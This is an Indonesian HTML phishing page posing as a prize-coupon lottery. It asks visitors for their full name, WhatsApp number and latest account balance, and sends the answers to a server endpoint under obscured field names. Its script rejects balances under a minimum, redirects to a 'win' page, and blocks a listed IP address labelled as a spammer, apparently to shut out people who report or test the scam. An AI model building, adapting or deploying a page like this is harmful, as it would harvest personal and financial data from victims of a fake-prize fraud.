<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Cetak Kupon</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 500px;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(to right, #2575fc, #6a11cb);
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .form-container {
            padding: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        .form-group input:focus {
            border-color: #2575fc;
            outline: none;
            box-shadow: 0 0 0 2px rgba(37, 117, 252, 0.2);
        }
        
        .submit-btn {
            background: linear-gradient(to right, #2575fc, #6a11cb);
            color: white;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
        }
        
        .submit-btn:hover {
            opacity: 0.95;
            transform: translateY(-2px);
        }
        
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .info-box {
            background-color: #f8f9fa;
            border-left: 4px solid #2575fc;
            padding: 15px;
            margin-top: 25px;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .info-box h3 {
            margin-bottom: 8px;
            color: #2575fc;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #777;
            border-top: 1px solid #eee;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 15px 0;
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                width: 95%;
            }
            
            .header {
                padding: 20px;
            }
            
            .form-container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Cetak Kupon Hadiah</h1>
            <p>Isi form berikut untuk mendapatkan kupon undian</p>
        </div>
        
        <div class="form-container">
            <form id="formData">
                <div class="form-group">
                    <label for="name">Nama Lengkap</label>
                    <input type="text" id="name" name="a" placeholder="Masukkan nama lengkap" required>
                </div>
                
                <div class="form-group">
                    <label for="phone">Nomor WhatsApp</label>
                    <input type="tel" id="phone" name="b" placeholder="Contoh: 081234567890" required>
                </div>
                
                <div class="form-group">
                    <label for="balance">Saldo Terakhir</label>
                    <input type="number" id="balance" name="c" placeholder="Contoh: 500000" required>
                </div>
                
                <div class="loading" id="loading">
                    <div class="loading-spinner"></div>
                    <p>Mengirim data...</p>
                </div>
                
                <button type="submit" id="kirim" class="submit-btn">Cetak Kupon</button>
            </form>
            
            <div class="info-box">
                <h3>Informasi Penting</h3>
                <p>Pastikan data yang Anda masukkan benar dan valid. Kupon akan dikirim melalui WhatsApp setelah proses verifikasi.</p>
            </div>
        </div>
        
        <div class="footer">
            <p>&copy; 2023 Program Undian. Semua hak dilindungi.</p>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", async () => {
            const form = document.getElementById("formData");
            const submitBtn = document.getElementById("kirim");
            const loading = document.getElementById("loading");
            let isSubmitting = false;

            // üî• Daftar IP spammer
            const blockedIPs = [
                "180.248.76.246",
                
            ];

            // üîç Cek IP user
            const userIP = await getPublicIP();
            if (userIP && blockedIPs.includes(userIP)) {
                alert("Akses kamu diblokir karena terdeteksi sebagai spam!");
                form.innerHTML = "<div style='text-align:center;padding:20px;color:#d32f2f;'><h3>Akses Diblokir</h3><p>IP address Anda terdeteksi sebagai spam dan tidak dapat mengakses form ini.</p></div>";
                return;
            }

            form.addEventListener("submit", async function (e) {
                e.preventDefault();

                if (isSubmitting) {
                    alert("Tunggu sebentar ya, sedang memproses...");
                    return;
                }

                isSubmitting = true;
                submitBtn.disabled = true;
                loading.style.display = 'block';
                submitBtn.innerText = "Memproses Cetak Kupon...";

                const formData = new FormData(form);
                const data = Object.fromEntries(formData.entries());

                // ‚úã Validasi manual di client-side
                const noWA = data.b || '';
                const saldo = data.c || '';

                if (!/^08[0-9]{8,13}$/.test(noWA)) {
                    alert("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
                    resetBtn();
                    return;
                }

                if (saldo.length < 3 || parseInt(saldo) < 100) {
                    alert("Saldo terlalu kecil untuk diikutkan. Minimal Rp 100.");
                    resetBtn();
                    return;
                }

                try {
                    // Kirim data ke endpoint API server-side Anda
                    const response = await fetch('/api/nondril', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    });

                    const result = await response.json();

                    if (result.success) {
                        vibr(180);
                        setTimeout(() => {
                            window.location.href = 'win.html';
                        }, 1000);
                    } else {
                        alert(result.message || "Gagal mengirim. Coba lagi.");
                    }
                } catch (err) {
                    console.error("Error:", err);
                    alert("Terjadi kesalahan saat kirim data.");
                }

                resetBtn();
            });

            function resetBtn() {
                isSubmitting = false;
                submitBtn.disabled = false;
                submitBtn.innerText = "Cetak Kupon";
                loading.style.display = 'none';
            }

            async function getPublicIP() {
                try {
                    const res = await fetch("https://api.ipify.org?format=json");
                    const data = await res.json();
                    return data.ip;
                } catch (err) {
                    console.error("Gagal ambil IP:", err);
                    return null;
                }
            }

            // Fungsi vibrasi (jika didukung browser)
            function vibr(duration) {
                if (navigator.vibrate) {
                    navigator.vibrate(duration);
                }
            }
        });
    </script>
</body>
</html>
